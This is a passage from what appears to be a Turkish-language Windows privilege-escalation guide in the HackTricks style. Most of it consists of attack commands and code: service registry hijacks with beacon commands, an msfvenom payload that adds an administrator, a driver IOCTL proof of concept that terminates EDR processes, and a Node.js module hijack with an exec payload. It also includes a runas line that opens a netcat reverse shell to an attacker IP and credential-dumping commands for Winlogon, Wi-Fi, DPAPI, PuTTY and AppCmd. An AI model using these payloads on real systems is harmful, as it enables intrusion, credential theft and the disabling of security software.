Normal bir kullanıcının başlatabildiği bir service seçin (ör. **`msiserver`**) ve yazma işleminden sonra onu tetikleyin. **Not:** public exploit implementation, race’in bir parçası olarak **workstation**’ı kilitler.

Örnek tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

Bir registry üzerinde bu izne sahipseniz bu, bu registry altında **alt registry’ler oluşturabileceğiniz** anlamına gelir. Windows hizmetleri durumunda bu, **keyfi kod çalıştırmak için yeterlidir:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Bir executable yolunun etrafı quotes içinde değilse, Windows boşluktan önceki her bitişi çalıştırmaya çalışır.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şunu çalıştırmaya çalışır:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Yerleşik Windows servislerine ait olanlar hariç tüm tırnaksız service path'leri listele:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Bu güvenlik açığını** metasploit ile tespit edip istismar edebilirsiniz: `exploit/windows/local/trusted\_service\_path` Bir servis binary’sini metasploit ile manuel olarak oluşturabilirsiniz:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Kurtarma Eylemleri

Windows, bir hizmet başarısız olursa gerçekleştirilecek eylemleri kullanıcıların belirtmesine izin verir. Bu özellik, bir binary'yi işaret edecek şekilde yapılandırılabilir. Eğer bu binary değiştirilebilir ise, privilege escalation mümkün olabilir. Daha fazla ayrıntı [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) içinde bulunabilir.

## Uygulamalar

### Yüklü Uygulamalar

**binary'lerin izinlerini** (belki birini üzerine yazabilir ve privileges yükseltebilirsiniz) ve **klasörlerin** izinlerini ([DLL Hijacking](dll-hijacking/index.html)) kontrol edin.
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Yazma İzinleri

Bazı config dosyasını değiştirerek özel bir dosyayı okuyup okuyamayacağınızı veya bir Administrator account tarafından çalıştırılacak bazı binary’yi değiştirip değiştiremeyeceğinizi kontrol edin (schedtasks).

Sistemde zayıf folder/files permissions bulmanın bir yolu şunu yapmaktır:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ `plugins` alt klasörleri altındaki herhangi bir plugin DLL'ini otomatik olarak yükler. Yazılabilir bir portable/copy kurulum varsa, kötü amaçlı bir plugin bırakmak her başlatmada `notepad++.exe` içinde otomatik code execution sağlar ( `DllMain` ve plugin callbacks dahil).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Başka bir kullanıcı tarafından çalıştırılacak bazı registry veya binary üzerine yazıp yazamayacağınızı kontrol edin.**\
Yükseltilmiş privileges elde etmek için ilginç **autoruns locations** hakkında daha fazla bilgi edinmek için **aşağıdaki sayfayı okuyun**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Olası **third party weird/vulnerable** drivers arayın
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Eğer bir driver keyfi bir kernel read/write primitive açığa çıkarıyorsa (kötü tasarlanmış IOCTL handlers içinde yaygın), kernel memory’den doğrudan bir SYSTEM token çalarak yetki yükseltebilirsiniz. Adım adım teknik için buraya bakın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Vulnerable call’in attacker-controlled bir Object Manager path açtığı race-condition bug’larında, lookup’u kasıtlı olarak yavaşlatmak (max-length components veya derin directory chain’ler kullanarak) pencereyi microsecond’lardan onlarca microsecond’a uzatabilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities, deterministic layout hazırlamanıza, writable HKLM/HKU descendants’ları abuse etmenize ve metadata corruption’u custom driver olmadan kernel paged-pool overflow’larına dönüştürmenize izin verir. Tam zinciri burada öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` attacker-controlled path’lerden direct-mode type confusion

Bazı drivers, userland’den bir registry path kabul eder, yalnızca bunun makul bir UTF-16 string olduğunu doğrular ve sonra `RTL_QUERY_REGISTRY_DIRECT` ile `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` çağırarak sonucu `int readValue` gibi stack üzerindeki bir scalar’a yazar. `RTL_QUERY_REGISTRY_TYPECHECK` eksikse, `EntryContext` geliştiricinin beklediği type’a göre değil, **gerçek** registry type’ına göre yorumlanır.

Bu iki faydalı primitive oluşturur:

- **Confused deputy / oracle**: kullanıcı kontrollü bir absolute `\Registry\...` path, driver’ın saldırganın seçtiği keys’i sorgulamasına izin verir, existence bilgisini return codes/logs üzerinden leak eder ve bazen çağıranın doğrudan erişemeyeceği values’ları okur.
- **Kernel memory corruption**: `&readValue` gibi scalar bir destination, registry value type’a bağlı olarak `REG_QWORD`, `UNICODE_STRING` veya boyutlu binary buffer gibi type-confused hale gelir.

Pratik exploitation notları:

- **Windows 8+ mitigation**: query, `RTL_QUERY_REGISTRY_DIRECT` ile ama `RTL_QUERY_REGISTRY_TYPECHECK` olmadan bir **untrusted hive**’a giderse, kernel callers `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ile crash olur. Exploitability’yi korumak için `HKCU` altında değer hazırlamak yerine **trusted system hives** içindeki attacker-writable keys’leri arayın.
- **Trusted-hive staging**: `\Registry\Machine` altındaki writable descendants’ları listelemek için NtObjectManager kullanın ve sandboxed contexts’lerden erişilebilen keys’leri bulmak için taramayı çoğaltılmış bir **low-integrity** token ile yeniden çalıştırın:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4 baytlık bir `int` içine yapılan 8 baytlık doğrudan yazma, bitişik stack verisini bozar ve yakındaki bir callback/function pointer’ı kısmen üzerine yazabilir.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode, `EntryContext`’in bir `UNICODE_STRING`’e işaret etmesini bekler. Kod önce saldırgan kontrollü bir `REG_DWORD` değerini stack’teki bir skaler değişkene yükleyip sonra aynı buffer’ı bir string okuması için yeniden kullanırsa, saldırgan `Length`/`MaximumLength` değerlerini kontrol eder ve `Buffer` pointer’ını kısmen etkiler; bu da yarı kontrollü bir kernel write sağlar.
- **`REG_BINARY`**: büyük binary veriler için direct mode, `EntryContext` üzerindeki ilk `LONG` değerini işaretli bir buffer boyutu olarak ele alır. Önceki bir `REG_DWORD` okuması yeniden kullanılan skalerde saldırgan kontrollü **negatif** bir değer bırakırsa, sonraki `REG_BINARY` sorgusu saldırgan byte’larını doğrudan bitişik stack slot’larının üzerine kopyalar; bu çoğu zaman tam callback-pointer overwrite için en temiz yoldur.

Güçlü hunting paterni: **aynı stack değişkenine yeniden initialize etmeden heterojen registry okumaları**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, yeniden kullanılan `EntryContext` pointer’ları ve ilk registry okumasının ikinci bir okumanın yapılıp yapılmayacağını kontrol ettiği code path’ler için grep yapın.

#### Eksik FILE_DEVICE_SECURE_OPEN’un device object’lerde kötüye kullanılması (LPE + EDR kill)

Bazı imzalı üçüncü taraf driver’lar device object’lerini IoCreateDeviceSecure ile güçlü bir SDDL kullanarak oluşturur ama `DeviceCharacteristics` içinde `FILE_DEVICE_SECURE_OPEN` ayarını yapmayı unutur. Bu flag olmadığında, device ekstra bir bileşen içeren bir path üzerinden açıldığında secure DACL uygulanmaz; bu da herhangi bir yetkisiz kullanıcının aşağıdaki gibi bir namespace path kullanarak handle almasına izin verir:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek bir vakadan)

Bir kullanıcı device’ı açabildiğinde, driver’ın sunduğu privileged IOCTL’ler LPE ve manipulation için kötüye kullanılabilir. Vahşi ortamda gözlemlenen örnek kabiliyetler:
- Arbitary process’lere tam erişimli handle döndürme (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Kısıtlamasız raw disk read/write (offline tampering, boot-time persistence tricks).
- Protected Process/Light (PP/PPL) dahil arbitary process’leri sonlandırma; böylece kernel üzerinden user land’den AV/EDR kill mümkün olur.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Geliştiriciler için mitigasyonlar
- DACL tarafından kısıtlanması amaçlanan device object’leri oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarlayın.
- Ayrıcalıklı işlemler için caller context’i doğrulayın. Process termination veya handle return’lerine izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTL’leri kısıtlayın (access masks, METHOD_*, input validation) ve doğrudan kernel privileges yerine brokered modelleri değerlendirin.

Defender’lar için detection fikirleri
- Şüpheli device name’lerin user-mode opens işlemlerini (örn. \\ .\\amsdk*) ve abuse’u gösteren belirli IOCTL sequence’lerini izleyin.
- Microsoft’un vulnerable driver blocklist’ini (HVCI/WDAC/Smart App Control) zorunlu kılın ve kendi allow/deny list’lerinizi güncel tutun.


## PATH DLL Hijacking

Eğer PATH üzerinde bulunan bir klasör içinde **write permissions** varsa, bir process tarafından yüklenen bir DLL’i hijack edip **privileges yükseltebilirsiniz**.

PATH içindeki tüm klasörlerin permissions’larını kontrol edin:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bu kontrolü nasıl kötüye kullanacağınız hakkında daha fazla bilgi için:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` üzerinden Node.js / Electron module resolution hijacking

Bu, **Windows uncontrolled search path** varyantıdır ve **Node.js** ve **Electron** uygulamalarını, `require("foo")` gibi çıplak bir import yaptıklarında ve beklenen module **eksik** olduğunda etkiler.

Node, dizin ağacında yukarı doğru ilerleyerek ve her üst dizinde `node_modules` klasörlerini kontrol ederek paketleri çözer. Windows'ta bu yürüyüş sürü köküne kadar ulaşabilir; bu yüzden `C:\Users\Administrator\project\app.js` içinden başlatılan bir uygulama şu yolları yoklayabilir:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Eğer **low-privileged user** `C:\node_modules` oluşturabiliyorsa, kötü amaçlı bir `foo.js` (veya package folder) yerleştirip bir **higher-privileged Node/Electron process**'in eksik dependency'yi çözmesini bekleyebilir. Payload, kurban process'in security context'inde çalışır; bu nedenle hedef bir administrator olarak, yükseltilmiş bir scheduled task/service wrapper üzerinden veya otomatik başlatılan ayrıcalıklı bir desktop app olarak çalıştığında bu durum **LPE** olur.

Bu özellikle şu durumlarda yaygındır:

- bir dependency `optionalDependencies` içinde tanımlanmışsa
- üçüncü taraf bir library `require("foo")` çağrısını `try/catch` ile sarıp hata durumunda devam ediyorsa
- bir package production build'lerden kaldırılmışsa, packaging sırasında atlanmışsa veya install edilememişse
- zafiyetli `require()` ana application code yerine dependency tree'nin derinlerinde yer alıyorsa

### Zafiyetli hedefleri avlama

Çözümleme yolunu doğrulamak için **Procmon** kullanın:

- `Process Name` filtresi = hedef executable (`node.exe`, Electron app EXE'si veya wrapper process)
- `Path` filtresi `contains` `node_modules`
- `NAME NOT FOUND` ve `C:\node_modules` altındaki son başarılı open'a odaklanın

Paketinden çıkarılmış `.asar` dosyalarında veya application source'larında faydalı code-review kalıpları:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Sömürü

1. Procmon veya kaynak incelemesinden **eksik paket adını** belirleyin.
2. Eğer zaten yoksa root lookup dizinini oluşturun:
```powershell
mkdir C:\node_modules
```
3. Tam beklenen ada sahip bir module bırakın:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Kurban uygulamayı tetikleyin. Uygulama `require("foo")` yapmaya çalışırsa ve meşru module yoksa, Node `C:\node_modules\foo.js` dosyasını yükleyebilir.

Bu desene uyan eksik optional module için gerçek dünya örnekleri arasında `bluebird` ve `utf-8-validate` bulunur, ancak **technique** yeniden kullanılabilir kısımdır: ayrıcalıklı bir Windows Node/Electron process tarafından çözülecek herhangi bir **missing bare import** bulun.

### Detection ve hardening fikirleri

- Bir kullanıcı `C:\node_modules` oluşturduğunda veya oraya yeni `.js` dosyaları/package'ler yazdığında alert verin.
- `C:\node_modules\*` içinden okuyan high-integrity process'leri hunt edin.
- Runtime bağımlılıklarının tamamını production içinde paketleyin ve `optionalDependencies` kullanımını denetleyin.
- Üçüncü taraf code'da sessiz `try { require("...") } catch {}` pattern'lerini gözden geçirin.
- Library bunu destekliyorsa optional probe'ları devre dışı bırakın (örneğin, bazı `ws` deployment'ları `WS_NO_UTF_8_VALIDATE=1` ile legacy `utf-8-validate` probe'unu önleyebilir).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts dosyasında sabit kodlanmış diğer bilinen bilgisayarları kontrol edin
```
type C:\Windows\System32\drivers\etc\hosts
```
### Network Arayüzleri & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Açık Portlar

Dışarıdan **restricted services** için kontrol edin
```bash
netstat -ano #Opened ports?
```
### Yönlendirme Tablosu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tablosu
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Kuralları

[**Firewall ile ilgili komutlar için bu sayfayı kontrol edin**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listele, kurallar oluştur, kapat, kapat...)**

Ağ keşfi için daha fazla [komut burada](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` ayrıca `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` içinde de bulunabilir

Root kullanıcı olursanız herhangi bir portta dinleyebilirsiniz (`nc.exe` ile bir portta dinlemek için ilk kez kullandığınızda, GUI üzerinden `nc`'nin firewall tarafından izin verilip verilmeyeceğini soracaktır).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Bash’i root olarak kolayca başlatmak için `--default-user root` deneyebilirsiniz

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe inceleyebilirsiniz

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault, kullanıcıların **Windows** tarafından otomatik olarak **giriş yapılabilen** sunucular, web siteleri ve diğer programlar için kimlik bilgilerini saklar. İlk bakışta bu, kullanıcıların Facebook kimlik bilgilerini, Twitter kimlik bilgilerini, Gmail kimlik bilgilerini vb. saklayabildiği ve böylece tarayıcılar üzerinden otomatik giriş yapabildiği anlamına geliyor gibi görünebilir. Ancak durum böyle değildir.

Windows Vault, Windows’un kullanıcılara otomatik olarak giriş yapabildiği kimlik bilgilerini saklar; bu da, **bir kaynağa erişmek için kimlik bilgilerine ihtiyaç duyan herhangi bir Windows uygulamasının** bu Credential Manager ve Windows Vault’tan yararlanıp, kullanıcıların sürekli kullanıcı adı ve parola girmesi yerine sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmedikçe, belirli bir kaynak için bu kimlik bilgilerini kullanmalarının mümkün olduğunu düşünmüyorum. Dolayısıyla, uygulamanız vault’tan yararlanmak istiyorsa, bir şekilde **credential manager ile iletişim kurmalı ve varsayılan storage vault’tan o kaynak için kimlik bilgilerini istemelidir**.

Makinede depolanmış kimlik bilgilerini listelemek için `cmdkey` kullanın.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Sonra kaydedilmiş kimlik bilgilerini kullanmak için `runas` komutunu `/savecred` seçenekleriyle kullanabilirsiniz. Aşağıdaki örnek, bir SMB paylaşımı üzerinden uzak bir binary çağırıyor.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Sağlanan kimlik bilgileriyle `runas` kullanma.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)**, verileri simetrik olarak şifrelemek için bir yöntem sağlar ve ağırlıklı olarak Windows işletim sisteminde asimetrik özel anahtarların simetrik şifrelenmesi için kullanılır. Bu şifreleme, entropiye önemli ölçüde katkıda bulunmak için bir kullanıcı veya sistem secret'ından yararlanır.

**DPAPI, anahtarların kullanıcının login secrets'inden türetilen bir simetrik key ile şifrelenmesini sağlar**. system encryption içeren senaryolarda, sistemin domain authentication secrets'ini kullanır.

DPAPI kullanılarak şifrelenmiş kullanıcı RSA key'leri, `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır; burada `{SID}`, kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil eder. **DPAPI key, kullanıcının private key'lerini aynı dosyada koruyan master key ile aynı konumda bulunur** ve tipik olarak 64 bayt rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu, bu nedenle CMD içindeki `dir` komutuyla içeriğinin listelenemediğini, ancak PowerShell üzerinden listelenebildiğini belirtmek önemlidir).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Bunu çözmek için uygun argümanlarla (`/pvk` veya `/rpc`) **mimikatz module** `dpapi::masterkey` kullanabilirsiniz.

**master password** ile korunan **credentials files** genellikle şurada bulunur:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** genellikle **scripting** ve otomasyon görevlerinde, şifrelenmiş kimlik bilgilerini rahatça saklamak için kullanılır. Bu kimlik bilgileri **DPAPI** kullanılarak korunur; bu da tipik olarak yalnızca oluşturuldukları aynı bilgisayardaki aynı kullanıcı tarafından çözülebilecekleri anlamına gelir.

Bir PS credentials öğesini içeren dosyadan **decrypt** etmek için şunu yapabilirsiniz:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Kayıtlı RDP Bağlantıları

Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\` içinde bulabilirsiniz

### Yakın Zamanda Çalıştırılan Komutlar
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının mevcut olup olmadığını kontrol edin .\
Yükleyiciler **SYSTEM yetkileriyle çalıştırılır**, birçoğu **DLL Sideloading**’e karşı savunmasızdır (Bilgi: [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dosyalar ve Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Registry içinde SSH keys

SSH private keys registry key `HKCU\Software\OpenSSH\Agent\Keys` içinde saklanabilir, bu yüzden orada ilginç bir şey olup olmadığını kontrol etmelisiniz:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Eğer o path içinde herhangi bir giriş bulursanız, bu büyük olasılıkla kaydedilmiş bir SSH key olacaktır. Şifreli olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca decrypt edilebilir.\
